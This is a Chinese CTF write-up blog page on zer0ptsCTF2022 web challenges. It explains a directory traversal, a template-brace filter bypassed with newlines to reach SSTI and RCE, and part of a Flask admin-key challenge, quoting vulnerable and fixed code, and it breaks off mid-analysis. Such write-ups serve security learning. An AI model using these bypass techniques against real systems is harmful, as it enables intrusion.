@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="zer0ptsCTF2022复现其实都在虎符坐牢，虎符做完牢之后zer0pts的比赛也就差不多结束了。。。虎符四个web感觉有两个不怎么web，zer0pts六个web感觉也有一半不怎么web。。。zer0pts当初还是我提议拉一个队打一下的拉着。。。对不起其他究极输出的师傅们。然后最后一个小时简单的看了一下web题。一共六个web，一个签到，两个感觉不是很web的题，以及这两个不是很web的题被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zer0ptsCTF2022复现">
+<meta property="og:url" content="https://blog.z3ratu1.cn/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="zer0ptsCTF2022复现其实都在虎符坐牢，虎符做完牢之后zer0pts的比赛也就差不多结束了。。。虎符四个web感觉有两个不怎么web，zer0pts六个web感觉也有一半不怎么web。。。zer0pts当初还是我提议拉一个队打一下的拉着。。。对不起其他究极输出的师傅们。然后最后一个小时简单的看了一下web题。一共六个web，一个签到，两个感觉不是很web的题，以及这两个不是很web的题被">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-03-23T11:50:03.000Z">
+<meta property="article:modified_time" content="2022-03-24T10:08:44.041Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>zer0ptsCTF2022复现 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          zer0ptsCTF2022复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-23 19:50:03" itemprop="dateCreated datePublished" datetime="2022-03-23T19:50:03+08:00">2022-03-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-24 18:08:44" itemprop="dateModified" datetime="2022-03-24T18:08:44+08:00">2022-03-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="zer0ptsCTF2022复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="zer0ptsCTF2022复现"><a href="#zer0ptsCTF2022复现" class="headerlink" title="zer0ptsCTF2022复现"></a>zer0ptsCTF2022复现</h1><p>其实都在虎符坐牢，虎符做完牢之后zer0pts的比赛也就差不多结束了。。。<br>虎符四个web感觉有两个不怎么web，zer0pts六个web感觉也有一半不怎么web。。。<br>zer0pts当初还是我提议拉一个队打一下的拉着。。。对不起其他究极输出的师傅们。<br>然后最后一个小时简单的看了一下web题。一共六个web，一个签到，两个感觉不是很web的题，以及这两个不是很web的题被非预期之后的revenge，和一个完全没看不知道是个啥的题（说起来究极国际队也赛题被疯狂非预期了，并且这个赛题数量以及其和web的相关程度，感觉也没有比我们好很多。突然心里有点舒服了一点？）不过感觉他们还是影响力比我们大多了，并且他们常年举办比赛也很有经验，总之就是discord里看起来很热闹氛围很好呜呜（我现在才知道似乎discord和QQ群不一样发公告不要随便@全体。。。就丢在announcement里就行。。。以及现在的私聊比较流行的说法是dm，direct message）</p>
+<p>然后因为没有怎么看题所以不会坐牢，简单复现</p>
+<p>然后因为没有看多久所以简单看一下然后去codeql坐牢吧。。。</p>
+<h2 id="GitFile-Explorer"><a href="#GitFile-Explorer" class="headerlink" title="GitFile Explorer"></a>GitFile Explorer</h2><p>签到。是个人都能做。正则写的过于粗糙目录穿越一下即可<br><code>zer0pts&#123;foo/bar/../../../../../directory/traversal&#125;</code><br>如果把协议那里稍微写仔细一点感觉会难一点点点点</p>
+<h2 id="miniblog"><a href="#miniblog" class="headerlink" title="miniblog++"></a>miniblog++</h2><p>被非预期的web1<br>这个题预期解感觉和web的关系不大。。。</p>
+<p>但是非预期还是挺web的。以及叫做++不知道是不是往年有普通版</p>
+<p>代码非常的长，预期解是要打究极的zip协议再ssti。但由于在模板渲染处控制的不是很好结果就导致了直接的ssti打爆了。这里就简单的看一下这段吧</p>
+<p>修复前的代码</p>
+<pre class=" language-python"><code class="language-python">        <span class="token keyword">for</span> brace <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"{{.*?}}"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token operator">not</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"{{!?[a-zA-Z0-9_]+}}"</span><span class="token punctuation">,</span> brace<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">'You can only use "{{title}}", "{{author}}", and "{{date}}"'</span><span class="token punctuation">,</span> None
+</code></pre>
+<p>修复后的代码</p>
+<pre class=" language-python"><code class="language-python">        <span class="token keyword">for</span> m <span class="token keyword">in</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>r<span class="token string">"{{"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            p <span class="token operator">=</span> m<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{title}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{title}}'</span> <span class="token operator">or</span> \
+                    content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{author}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{author}}'</span> <span class="token operator">or</span> \
+                    content<span class="token punctuation">[</span>p<span class="token punctuation">:</span>p<span class="token operator">+</span>len<span class="token punctuation">(</span><span class="token string">'{{date}}'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'{{date}}'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">'You can only use "{{title}}", "{{author}}", and "{{date}}"'</span><span class="token punctuation">,</span> None
+</code></pre>
+<p>修复前的代码使用正则表达式去匹配所有的双大括号，然后只支持a-zA-Z0-9和下划线，也就理论上来说防御了SQL注入。但这里有一个非常严重的问题，就是<code>.</code>不匹配换行。而ssti是可以换行的，通过换行ssti执行到rce成功</p>
+<p>修了一下之后直接字符串等于了，超级修复。他们两个题的revenge的附件压缩包密码都是上一题的flag，这样子的做好不好呢？说起来这样子也就可以直接在修复里暴露出上一题的解法了，但是他们还是换了一个方法来修复。写的很死应该是怕再出问题吧。。。（毕竟我们的题目修复之后还是有超级漏洞就很丢脸了。。。）</p>
+<h2 id="Disco-Party"><a href="#Disco-Party" class="headerlink" title="Disco Party"></a>Disco Party</h2><p>被非预期的web2，感觉预期解应该是什么discord的特性黑魔法<br>代码还挺长的。</p>
+<p>主要看这段</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/post/&lt;string(length=16):id>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_post</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Read a ticket"""</span>
+    <span class="token comment" spellcheck="true"># Get ticket by ID</span>
+    content <span class="token operator">=</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>id<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> content <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token string">"not found"</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check if admin</span>
+    content <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+    key <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
+    is_admin <span class="token operator">=</span> isinstance<span class="token punctuation">(</span>key<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token operator">and</span> get_key<span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">==</span> key
+
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span>
+        <span class="token string">"index.html"</span><span class="token punctuation">,</span>
+        <span class="token operator">**</span>content<span class="token punctuation">,</span>
+        is_post<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+        panel<span class="token operator">=</span>f<span class="token triple-quoted-string string">"""
+&lt;strong>Hello admin! Your flag is: {FLAG}&lt;/strong>&lt;br>
+&lt;form id="delete-form" method="post" action="/api/delete">
+    &lt;input name="id" type="hidden" value="{id}">
+    &lt;input name="key" type="hidden" value="{key}">
+    &lt;button id="modal-button-delete" type="button">Delete This Post&lt;/button>
+&lt;/form>
+"""</span> <span class="token keyword">if</span> is_admin <span class="token keyword">else</span> <span class="token string">""</span><span class="token punctuation">,</span>
+        url<span class="token operator">=</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
+        sitekey<span class="token operator">=</span>RECAPTCHA_SITE_KEY
+    <span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/api/new"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">api_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Create a new ticket"""</span>
+    <span class="token comment" spellcheck="true"># Get parameters</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span>
+        content <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid request"</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Register a new ticket</span>
+    id <span class="token operator">=</span> b64digest<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
+    get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>set<span class="token punctuation">(</span>
+        id<span class="token punctuation">,</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"title"</span><span class="token punctuation">:</span> title<span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">:</span> content<span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span>
+                          <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Post created! Click here to see your post"</span><span class="token punctuation">,</span>
+                          <span class="token string">"action"</span><span class="token punctuation">:</span> f<span class="token string">"{flask.request.url_root}post/{id}"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/api/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">api_report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Reoprt an invitation ticket"""</span>
+    <span class="token comment" spellcheck="true"># Get parameters</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        url <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span>
+        reason <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span>
+        recaptcha_token <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"g-recaptcha-response"</span><span class="token punctuation">]</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid request"</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check reCAPTCHA</span>
+    score <span class="token operator">=</span> verify_recaptcha<span class="token punctuation">(</span>recaptcha_token<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> score <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Recaptcha verify failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> score <span class="token operator">&lt;=</span> <span class="token number">0.3</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> f<span class="token string">"Bye robot (score: {score})"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check URL</span>
+    parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Query string is not allowed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> f<span class="token string">'{parsed.scheme}://{parsed.netloc}/'</span> <span class="token operator">!=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url_root<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid host"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Parse path</span>
+    adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>host<span class="token punctuation">)</span>
+    endpoint<span class="token punctuation">,</span> args <span class="token operator">=</span> adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> endpoint <span class="token operator">!=</span> <span class="token string">"get_post"</span> <span class="token operator">or</span> <span class="token string">"id"</span> <span class="token operator">not</span> <span class="token keyword">in</span> args<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid endpoint"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token comment" spellcheck="true"># Check ID</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> get_redis_conn<span class="token punctuation">(</span>DB_TICKET<span class="token punctuation">)</span><span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid ID"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    message <span class="token operator">=</span> f<span class="token string">"URL: {url}?key={key}\nReason: {reason}"</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        get_redis_conn<span class="token punctuation">(</span>DB_BOT<span class="token punctuation">)</span><span class="token punctuation">.</span>rpush<span class="token punctuation">(</span>
+            <span class="token string">'report'</span><span class="token punctuation">,</span> message<span class="token punctuation">[</span><span class="token punctuation">:</span>MESSAGE_LENGTH_LIMIT<span class="token punctuation">]</span>
+        <span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"NG"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Post failed"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"result"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Successfully reported"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>访问post时如果带有正确的key就能拿到flag</p>
+<p>bot会将message写进redis，然后再发送到某个秘密channel中。我们要做的就是获取到这个key。说起来前面这里的解析。这么大一堆。。。。看的不是很懂呢<br>大致就是检查了url必须是题目的url，然后不能带get参数，并且一定要访问的是get_post对应的路由，这里的这段写法我就觉得有点玄幻（直接字符串比较不就行了么）</p>
